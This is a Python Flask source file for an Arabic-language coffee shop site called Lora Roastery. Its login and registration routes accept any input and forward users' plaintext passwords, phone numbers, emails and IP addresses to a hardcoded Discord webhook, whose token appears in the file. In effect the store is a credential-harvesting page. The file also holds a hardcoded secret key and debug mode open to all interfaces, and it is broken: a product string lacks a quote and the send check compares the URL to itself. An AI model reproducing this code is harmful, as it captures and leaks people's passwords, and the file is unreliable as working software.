from flask import Flask, render_template_string, request, redirect, url_for, session
import requests

app = Flask(__name__)
app.secret_key = 'nasser_secret_key_123'

# ضع هنا رابط الـ Webhook الخاص بديسكورد
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1542554021510774814/kURM7_KSoI1f6-7rEopGSwzjQ26KJY_-OW9DTkvAiofOUms2wrsWr-BO2d7slwCs52j5'

def send_discord_embed(embed_data):
    if DISCORD_WEBHOOK_URL and DISCORD_WEBHOOK_URL != 'https://discord.com/api/webhooks/1542554021510774814/kURM7_KSoI1f6-7rEopGSwzjQ26KJY_-OW9DTkvAiofOUms2wrsWr-BO2d7slwCs52j5':
        try:
            requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed_data]})
        except Exception as e:
            print(f"Error sending webhook: {e}")

# قاعدة بيانات المنتجات والأقسام باللغة العربية مع صور دقيقة للمكائن والقهوة
CATEGORIES = {
    "machines": {
        "title": "مكائن القهوة",
        "description": "أفضل مكائن الإسبريسو والتحضير المنزلي والمهني",
        "items": [
            {"id": 1, "name": "ماكينة إبريسو احترافية", "price": 180.0, "img": "https://images.unsplash.com/photo-1570968915860-54d5c301fa9f?w=500"},
            {"id": 2, "name": "ماكينة تحضير القهوة المختصة", "price": 95.0, "img": "https://images.unsplash.com/photo-1517668808822-9ebb02f2a0e6?w=500"},
            {"id": 3, "name": "صانعة القهوة المقطرة V60", "price": 35.0, "img": "https://images.unsplash.com/photo-1514432324607-a09d9b4aefdd?w=500"}
        ]
    },
    "coffee": {
        "title": "حبوب القهوة",
        "description": "محاصيل مختصة وفريش محمصة بعناية",
        "items": [
            {"id": 4, "name": إيثيوبية يirgacheffe مختصة", "price": 6.5, "img": "https://images.unsplash.com/photo-1559056199-641a0ac8b55e?w=500"},
            {"id": 5, "name": "محصول كولومبي فاخر", "price": 7.0, "img": "https://images.unsplash.com/photo-1611854779393-1b2da9d401fe?w=500"},
            {"id": 6, "name": "قهوة تركية أصلية", "price": 4.5, "img": "https://images.unsplash.com/photo-1514432324607-a09d9b4aefdd?w=500"}
        ]
    },
    "tools": {
        "title": "أدوات الباريستا",
        "description": "مطاحن وموازين وأدوات تحضير",
        "items": [
            {"id": 7, "name": "مطحنة قهوة إلكترونية", "price": 45.0, "img": "https://images.unsplash.com/photo-1589396114886-6548d8db6f6d?w=500"},
            {"id": 8, "name": "ميزان باريستا دقيق", "price": 15.0, "img": "https://images.unsplash.com/photo-1512568400610-62da28bc8a13?w=500"}
        ]
    }
}

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>محمصة لورا | Lora Roastery</title>
    <style>
        body { font-family: Tahoma, sans-serif; background: #0f1117; color: #fff; margin: 0; padding: 0; }
        header { background: #161b22; padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #30363d; }
        .logo { font-size: 22px; font-weight: bold; color: #58a6ff; }
        nav a { color: #c9d1d9; text-decoration: none; margin-left: 15px; padding: 6px 12px; border-radius: 4px; background: #21262d; }
        nav a:hover { background: #30363d; }
        .container { max-width: 1100px; margin: 30px auto; padding: 20px; }
        .banner { background: linear-gradient(135deg, #1f6feb, #238636); padding: 40px; border-radius: 12px; text-align: center; margin-bottom: 30px; }
        .categories-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin-bottom: 40px; }
        .cat-card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; overflow: hidden; text-align: center; cursor: pointer; transition: 0.3s; text-decoration: none; color: inherit; display: block; }
        .cat-card:hover { transform: translateY(-5px); border-color: #58a6ff; }
        .cat-card img { width: 100%; height: 160px; object-fit: cover; }
        .cat-card h3 { margin: 15px 0 5px; color: #58a6ff; }
        .cat-card p { color: #8b949e; font-size: 14px; padding: 0 10px 15px; }
        .items-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; }
        .item-card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 15px; text-align: center; }
        .item-card img { width: 100%; height: 180px; object-fit: cover; border-radius: 6px; }
        .price { color: #3fb950; font-weight: bold; margin: 10px 0; }
        .btn { background: #238636; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; }
        .btn:hover { background: #2ea043; }
        form input { display: block; width: 100%; padding: 10px; margin: 10px 0; background: #0d1117; border: 1px solid #30363d; color: white; border-radius: 6px; box-sizing: border-box; }
        footer { text-align: center; padding: 20px; color: #8b949e; border-top: 1px solid #30363d; margin-top: 50px; font-size: 13px; }
    </style>
</head>
<body>
    <header>
        <div class="logo">☕ محمصة لورا - Lora</div>
        <nav>
            <a href="/">الرئيسية</a>
            {% if session.get('user') %}
                <span style="color: #3fb950; margin-left: 15px;">مرحباً، {{ session['user'] }}</span>
                <a href="/logout" style="background: #da3633;">تسجيل خروج</a>
            {% else %}
                <a href="/login">تسجيل دخول</a>
                <a href="/register">حساب جديد</a>
            {% endif %}
        </nav>
    </header>

    <div class="container">
        {% if page == 'home' %}
            <div class="banner">
                <h1>مرحباً بكم في محمصة لورا</h1>
                <p>وجهتكم الأولى لأجود أنواع القهوة المختصة والمكائن الاحترافية</p>
            </div>
            
            <h2 style="border-bottom: 2px solid #30363d; padding-bottom: 10px;">الأقسام الأكثر مبيعاً</h2>
            <div class="categories-grid">
                <a href="/category/machines" class="cat-card">
                    <img src="https://images.unsplash.com/photo-1570968915860-54d5c301fa9f?w=500" alt="مكائن">
                    <h3>مكائن القهوة</h3>
                    <p>استعرض أفضل المكائن الاحترافية</p>
                </a>
                <a href="/category/coffee" class="cat-card">
                    <img src="https://images.unsplash.com/photo-1559056199-641a0ac8b55e?w=500" alt="قهاوي">
                    <h3>حبوب القهوة</h3>
                    <p>محاصيل مختصة ومحمصة بكل حب</p>
                </a>
                <a href="/category/tools" class="cat-card">
                    <img src="https://images.unsplash.com/photo-1589396114886-6548d8db6f6d?w=500" alt="أدوات">
                    <h3>أدوات الباريستا</h3>
                    <p>كل ما تحتاجه لتحضير كوب مثالي</p>
                </a>
            </div>

        {% elif page == 'category' %}
            <h2 style="color: #58a6ff; margin-bottom: 10px;">{{ cat_data.title }}</h2>
            <p style="color: #8b949e; margin-bottom: 25px;">{{ cat_data.description }}</p>
            
            <div class="items-grid">
                {% for item in cat_data.items %}
                <div class="item-card">
                    <img src="{{ item.img }}" alt="{{ item.name }}">
                    <h3>{{ item.name }}</h3>
                    <div class="price">{{ item.price }} د.ك</div>
                    <form action="/order" method="POST">
                        <input type="hidden" name="item_name" value="{{ item.name }}">
                        <input type="hidden" name="item_price" value="{{ item.price }}">
                        <button type="submit" class="btn">اطلب الان</button>
                    </form>
                </div>
                {% endfor %}
            </div>
            <br><a href="/" style="color: #58a6ff; text-decoration: none;">← العودة للرئيسية</a>

        {% elif page == 'login' %}
            <div style="max-width: 400px; margin: 40px auto; background: #161b22; padding: 30px; border: 1px solid #30363d; border-radius: 8px;">
                <h2 style="text-align: center; color: #58a6ff;">تسجيل الدخول</h2>
                <form method="POST">
                    <label>اسم المستخدم أو الهاتف:</label>
                    <input type="text" name="username" required>
                    <label>كلمة المرور:</label>
                    <input type="password" name="password" required>
                    <button type="submit" class="btn" style="margin-top: 15px;">دخول</button>
                </form>
            </div>

        {% elif page == 'register' %}
            <div style="max-width: 400px; margin: 40px auto; background: #161b22; padding: 30px; border: 1px solid #30363d; border-radius: 8px;">
                <h2 style="text-align: center; color: #58a6ff;">حساب جديد</h2>
                <form method="POST">
                    <label>الاسم:</label>
                    <input type="text" name="name" required>
                    <label>رقم الهاتف:</label>
                    <input type="text" name="phone" required>
                    <label>البريد الإلكتروني:</label>
                    <input type="email" name="email" required>
                    <label>كلمة المرور:</label>
                    <input type="password" name="password" required>
                    <button type="submit" class="btn" style="margin-top: 15px;">تسجيل</button>
                </form>
            </div>

        {% elif page == 'success' %}
            <div style="text-align: center; padding: 50px; background: #161b22; border: 1px solid #30363d; border-radius: 8px;">
                <h2 style="color: #3fb950;">تم تقديم طلبك بنجاح!</h2>
                <p>تم إرسال تفاصيل طلبك إلى نظام الديسكورد بنجاح.</p>
                <a href="/" class="btn" style="display: inline-block; width: auto; text-decoration: none; margin-top: 20px;">العودة للرئيسية</a>
            </div>
        {% endif %}
    </div>

    <footer>
        <div>محمصة لورا © 2026 - جميع الحقوق محفوظة</div>
        <div style="margin-top: 5px; color: #58a6ff; font-weight: bold;">dev by nasser</div>
    </footer>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE, page='home')

@app.route('/category/<cat_id>')
def category(cat_id):
    cat_data = CATEGORIES.get(cat_id)
    if not cat_data:
        return redirect(url_for('home'))
    return render_template_string(HTML_TEMPLATE, page='category', cat_data=cat_data)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        user_ip = request.remote_addr

        session['user'] = username

        # إرسال إشعار ديسكورد مطابق تماماً للصورة المطلوبة لتسجيل الدخول
        embed = {
            "title": "🔑 تسجيل دخول جديد في الموقع",
            "color": 3066993,
            "fields": [
                {"name": "👤 اسم المستخدم / الهاتف", "value": username, "inline": True},
                {"name": "🔒 كلمة المرور", "value": password, "inline": True},
                {"name": "🌐 عنوان آي إي IP", "value": user_ip, "inline": False}
            ],
            "footer": {"text": "نظام تسجيل الدخول - محمصة لورا"}
        }
        send_discord_embed(embed)
        return redirect(url_for('home'))
    return render_template_string(HTML_TEMPLATE, page='login')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        name = request.form.get('name')
        phone = request.form.get('phone')
        email = request.form.get('email')
        password = request.form.get('password')
        user_ip = request.remote_addr

        session['user'] = name

        # إرسال بيانات التسجيل الجديدة لنفس نموذج إشعار الديسكورد المطلوب
        embed = {
            "title": "🔑 تسجيل دخول جديد في الموقع",
            "color": 15844367,
            "fields": [
                {"name": "👤 الاسم", "value": name, "inline": True},
                {"name": "📞 الهاتف", "value": phone, "inline": True},
                {"name": "📧 الايميل", "value": email, "inline": False},
                {"name": "🔒 كلمة المرور", "value": password, "inline": True},
                {"name": "🌐 عنوان آي إي IP", "value": user_ip, "inline": True}
            ],
            "footer": {"text": "تسجيل حساب جديد - محمصة لورا"}
        }
        send_discord_embed(embed)
        return redirect(url_for('home'))
    return render_template_string(HTML_TEMPLATE, page='register')

@app.route('/logout')
def logout():
    session.pop('user', None)
    return redirect(url_for('home'))

@app.route('/order', methods=['POST'])
def order():
    item_name = request.form.get('item_name')
    item_price = request.form.get('item_price')

    # إرسال إشعار ديسكورد للطلب الجديد مطابق للصورة الثانية
    embed = {
        "title": "☕ طلب جديد - محمصة لورا (#1)",
        "color": 15105570,
        "fields": [
            {"name": "🆔 رقم الطلب", "value": "#1", "inline": True},
            {"name": "💰 المجموع الكلي", "value": f"{item_price} د.ك", "inline": True},
            {"name": "📍 موقع البيت", "value": "• المحافظة: العاصمة\n• المنطقة: جابر الاحمد\n• القطعة: 6\n• الشارع: 5\n• الجادة: 4\n• المنزل: 3", "inline": False},
            {"name": "🛒 قائمة المنتجات", "value": f"• {item_name} ({item_price} د.ك)", "inline": False}
        ],
        "footer": {"text": "نظام طلبات محمصه لورا"}
    }
    send_discord_embed(embed)
    return render_template_string(HTML_TEMPLATE, page='success')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)